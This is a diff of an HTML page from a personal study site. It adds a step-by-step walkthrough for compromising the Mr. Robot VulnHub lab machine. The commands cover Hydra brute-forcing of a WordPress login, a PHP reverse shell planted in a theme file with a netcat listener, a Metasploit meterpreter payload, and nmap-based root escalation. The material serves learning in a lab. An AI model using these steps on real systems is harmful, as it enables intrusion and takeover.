@@ -8,13 +8,11 @@
       
       
       
-        <link rel="canonical" href="https://hcoco1.github.io/Career-Simulation-4/challenge_1/">
+        <link rel="canonical" href="https://hcoco1.github.io/Career-Simulation-4/notes/">
       
       
-        <link rel="prev" href="../2-instructions/">
+        <link rel="prev" href="../challenge_6/">
       
-      
-        <link rel="next" href="../challenge_2/">
       
       
       <link rel="icon" href="../assets/images/favicon.png">
@@ -22,7 +20,7 @@
     
     
       
-        <title>Step 1: Set Up Environment - Penetration Testing Report ☠️</title>
+        <title>Overview of the Exploit Process - Penetration Testing Report ☠️</title>
       
     
     
@@ -76,7 +74,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#step-1-set-up-environment" class="md-skip">
+        <a href="#overview-of-the-exploit-process" class="md-skip">
           Skip to content
         </a>
       
@@ -112,7 +110,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Step 1: Set Up Environment
+              Overview of the Exploit Process
             
           </span>
         </div>
@@ -233,19 +231,10 @@
       
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../challenge_1/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -254,7 +243,6 @@
   
 
       </a>
-      
     </li>
   
 
@@ -363,10 +351,30 @@
       
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="../notes/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Overview of the Exploit Process
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   <span class="md-ellipsis">
@@ -375,6 +383,122 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#step-1-set-up-environment" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 1: Set Up Environment
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#step-2-network-scanning" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 2: Network Scanning
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#step-3-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 3: Enumeration
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#step-4-vulnerabilities" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 4: Vulnerabilities
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#step-5-brute-force" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 5: Brute-force
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#step-6-reverse-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 6: Reverse Shell
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Step 6: Reverse Shell">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#manual-php-reverse-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      Manual PHP Reverse Shell
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-metasploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using Metasploit
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#privilege-escalation-if-needed" class="md-nav__link">
+    <span class="md-ellipsis">
+      Privilege Escalation (if needed)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#clean-up" class="md-nav__link">
+    <span class="md-ellipsis">
+      Clean Up
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -394,60 +518,170 @@
                   
 
 
-<div><h1 id="step-1-set-up-environment"><strong>Step 1: Set Up Environment</strong></h1>
-<div class="admonition note"></div>
+<div><h1 id="overview-of-the-exploit-process">Overview of the Exploit Process</h1>
+<h2 id="step-1-set-up-environment">Step 1: Set Up Environment</h2>
 <ul>
-<li>Download and Install VirtualBox.</li>
+<li><strong>Objective:</strong> Prepare your Kali Linux attacker VM and the Mr. Robot Vulnhub target VM.</li>
+<li><strong>Actions:</strong></li>
+<li>Install necessary software on Kali Linux:
+    <div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>sudo<span class="w"> </span>apt<span class="w"> </span>update
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>-y<span class="w"> </span>nmap<span class="w"> </span>gobuster<span class="w"> </span>hydra<span class="w"> </span>metasploit-framework
+</code></pre></div></li>
 </ul>
-<p><img alt="alt text" src="../images/virtualbox1.jpg"></p>
+<h2 id="step-2-network-scanning">Step 2: Network Scanning</h2>
 <ul>
-<li>Download Kali Linux VM</li>
+<li><strong>Objective:</strong> Identify the target's open ports and services.</li>
+<li><strong>Tools:</strong> Nmap</li>
+<li><strong>Commands:</strong>
+    <div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>nmap<span class="w"> </span>-sS<span class="w"> </span>-sV<span class="w"> </span>-O<span class="w"> </span><span class="m">192</span>.168.1.226
+</code></pre></div></li>
 </ul>
-<p><img alt="alt text" src="../images/Kali_Linux.jpg"></p>
+<h2 id="step-3-enumeration">Step 3: Enumeration</h2>
 <ul>
-<li>Download Mr. Robot VM from VulnHub.</li>
+<li><strong>Objective:</strong> Gather detailed information about the target's web applications and technologies.</li>
+<li><strong>Tools:</strong> Gobuster, Wappalyzer</li>
+<li><strong>Commands:</strong>
+    <div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>gobuster<span class="w"> </span>dir<span class="w"> </span>-u<span class="w"> </span>http://192.168.1.226<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</code></pre></div></li>
+<li>Use Wappalyzer browser extension to identify web technologies used by the target site.</li>
 </ul>
-<p><img alt="alt text" src="../images/VulnHub.jpg"></p>
+<h2 id="step-4-vulnerabilities">Step 4: Vulnerabilities</h2>
 <ul>
-<li>Import Kali and  Mr. Robot VM into VirtualBox</li>
-<li>Create a VM’s  NAT Network.</li>
+<li><strong>Objective:</strong> Identify vulnerabilities in the target's web applications and services.</li>
+<li><strong>Tools:</strong> Nmap, Nikto</li>
+<li><strong>Commands:</strong>
+    <div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>nmap<span class="w"> </span>--script<span class="w"> </span>vuln<span class="w"> </span><span class="m">192</span>.168.1.226
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>nikto<span class="w"> </span>-h<span class="w"> </span>http://192.168.1.226
+</code></pre></div></li>
 </ul>
-<p><img alt="alt text" src="../images/virtualbox_topaz.jpg"></p>
+<h2 id="step-5-brute-force">Step 5: Brute-force</h2>
 <ul>
-<li>Sep up  the network adapter to “NAT Network” mode in both VM.</li>
+<li><strong>Objective:</strong> Gain access to the target by brute-forcing login credentials.</li>
+<li><strong>Tools:</strong> Hydra</li>
+<li><strong>Commands:</strong>
+    <div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span><span class="m">192</span>.168.1.226<span class="w"> </span>http-post-form<span class="w"> </span><span class="s2">"/wp-login.php:log=^USER^&amp;pwd=^PASS^:Invalid username"</span>
+</code></pre></div></li>
 </ul>
-<p><img alt="alt text" src="../images/VulnHub_nat.jpg"></p>
-<p><img alt="alt text" src="../images/kali_nat.jpg"></p>
+<h2 id="step-6-reverse-shell">Step 6: Reverse Shell</h2>
 <ul>
-<li>Start Kali and Mr Robot VM using VirtualBox Console.</li>
+<li><strong>Objective:</strong> Gain remote access to the target system.</li>
+<li><strong>Tools:</strong> PHP Reverse Shell, Metasploit</li>
 </ul>
-<p><img alt="alt text" src="../images/vms.jpg"></p>
-<div id="disqus_thread"></div>
-<script>
-    /**
-    *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
-    *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables    */
-    /*
-    var disqus_config = function () {
-    this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
-    this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
-    };
-    */
-    (function() { // DON'T EDIT BELOW THIS LINE
-    var d = document, s = d.createElement('script');
-    s.src = 'https://hcoco1-1.disqus.com/embed.js';
-    s.setAttribute('data-timestamp', +new Date());
-    (d.head || d.body).appendChild(s);
-    })();
-</script>
-<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-
-<div class="admonition note"></div>
-<div class="button-container" markdown="1">
-<a href="/Career-Simulation-3/2-instructions/" class="md-button md-button--primary">Previous: Introduction</a>
-<a href="/Career-Simulation-3/" class="md-button md-button--secondary">Home 🏠</a>
-<a href="/Career-Simulation-3/challenge_2/" class="md-button md-button--primary">Next: Step 2</a>
-</div></div>
+<h3 id="manual-php-reverse-shell">Manual PHP Reverse Shell</h3>
+<ol>
+<li><strong>Upload a PHP Reverse Shell:</strong></li>
+<li>Go to the WordPress admin panel at <code>http://192.168.1.226/wp-admin</code> and log in using the credentials found or brute-forced.</li>
+<li>
+<p>Navigate to Appearance &gt; Theme Editor, select the <code>404.php</code> file, and insert the PHP reverse shell code from <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">PentestMonkey</a>.</p>
+</li>
+<li>
+<p><strong>Start a Netcat Listener:</strong>
+    </p><div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4444</span>
+</code></pre></div>
+</li>
+<li>
+<p><strong>Trigger the Reverse Shell:</strong></p>
+</li>
+<li>Visit the modified <code>404.php</code> file in your browser to trigger the reverse shell.
+    <div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>http://192.168.1.226/wp-content/themes/<span class="o">[</span>your-theme<span class="o">]</span>/404.php
+</code></pre></div></li>
+</ol>
+<h3 id="using-metasploit">Using Metasploit</h3>
+<ol>
+<li>
+<p><strong>Start Metasploit:</strong>
+    </p><div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>msfconsole
+</code></pre></div>
+</li>
+<li>
+<p><strong>Select the Exploit Module:</strong>
+    </p><div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>use<span class="w"> </span>exploit/unix/webapp/wp_admin_shell_upload
+</code></pre></div>
+</li>
+<li>
+<p><strong>Set Required Options:</strong>
+    </p><div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="nb">set</span><span class="w"> </span>RHOSTS<span class="w"> </span><span class="m">192</span>.168.1.226
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="nb">set</span><span class="w"> </span>RPORT<span class="w"> </span><span class="m">80</span>
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="nb">set</span><span class="w"> </span>USERNAME<span class="w"> </span>Elliot
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="nb">set</span><span class="w"> </span>PASSWORD<span class="w"> </span>ER28-0652
+<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="nb">set</span><span class="w"> </span>TARGETURI<span class="w"> </span>/wp-admin
+<a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a><span class="nb">set</span><span class="w"> </span>LHOST<span class="w"> </span><span class="m">192</span>.168.1.223
+<a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a><span class="nb">set</span><span class="w"> </span>LPORT<span class="w"> </span><span class="m">4444</span>
+<a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a><span class="nb">set</span><span class="w"> </span>payload<span class="w"> </span>php/meterpreter/reverse_tcp
+<a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a><span class="nb">set</span><span class="w"> </span>VERBOSE<span class="w"> </span><span class="nb">true</span>
+</code></pre></div>
+</li>
+<li>
+<p><strong>Run the Exploit:</strong>
+    </p><div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>exploit
+</code></pre></div>
+</li>
+<li>
+<p><strong>Interacting with Meterpreter:</strong>
+    </p><div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>meterpreter &gt; shell
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>python -c 'import pty; pty.spawn("/bin/bash")'
+</code></pre></div>
+</li>
+<li>
+<p><strong>Navigating the File System:</strong>
+    </p><div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="nb">cd</span><span class="w"> </span>/home/robot
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>ls<span class="w"> </span>-a
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>cat<span class="w"> </span>key-1-of-3.txt
+<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>cat<span class="w"> </span>key-2-of-3.txt
+</code></pre></div>
+</li>
+</ol>
+<h3 id="privilege-escalation-if-needed">Privilege Escalation (if needed)</h3>
+<ul>
+<li>
+<p><strong>Identify SUID binaries:</strong>
+    </p><div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-u<span class="o">=</span>s<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</code></pre></div>
+</li>
+<li>
+<p><strong>Exploit Nmap for Privilege Escalation:</strong>
+    </p><div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>/usr/local/bin/nmap<span class="w"> </span>--interactive
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>!sh
+</code></pre></div>
+</li>
+<li>
+<p><strong>Read the Final Key:</strong>
+    </p><div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>find<span class="w"> </span>/<span class="w"> </span>-name<span class="w"> </span><span class="s2">"key-3-of-3.txt"</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>cat<span class="w"> </span>/root/key-3-of-3.txt
+</code></pre></div>
+</li>
+</ul>
+<h3 id="clean-up">Clean Up</h3>
+<ol>
+<li><strong>Remove Uploaded Files:</strong>
+    <div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>rm<span class="w"> </span>/wp-content/plugins/lCXSKnpNHP/DXgKrelAug.php
+<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>rm<span class="w"> </span>-rf<span class="w"> </span>/wp-content/plugins/lCXSKnpNHP
+</code></pre></div></li>
+</ol>
+<p>Step 1: Set Up Environment
+Step 2: Network Scanning : 
+    - nmap
+Step 3: Enumeration
+    - Gobuster
+    - Wappalyzer
+Step 4: Vulnerabilities
+    - nmap
+    - nikto
+Step 5: Brute-force
+    - Python Scripts
+    - Hydra
+Step 6: Reverse Shell
+    - PHP Reverse Shell
+    - Metasploit
+Report
+Videos</p>
+<p>Hi, I'm Ivan, and today I'll show you how to exploit the Mr. Robot Vulnhub VM using Kali Linux.</p>
+<p>First, I set up the Kali Linux attacker VM and the Mr. Robot target VM, which hosts a WordPress site with three hidden keys. I used Nmap to scan the target IP for open ports and services.</p>
+<p>Next, I used Gobuster to find hidden directories and Wappalyzer to identify web technologies in use.</p>
+<p>Then, I looked for vulnerabilities using Nmap scripts and Nikto. After identifying potential weak points, I used Hydra to intelligently brute-force the WordPress admin login.</p>
+<p>Once I obtained the login credentials, I exploited the WordPress admin interface using Metasploit. By configuring the wp_admin_shell_upload module and running the exploit, I gained a Meterpreter session, which allowed me to navigate the file system.</p>
+<p>Finally, I located and read the three hidden keys on the target system.</p>
+<p>And that's how you can exploit the Mr. Robot VM using Kali Linux to find all the hidden keys. Thanks for watching!</p></div>
 
 
 
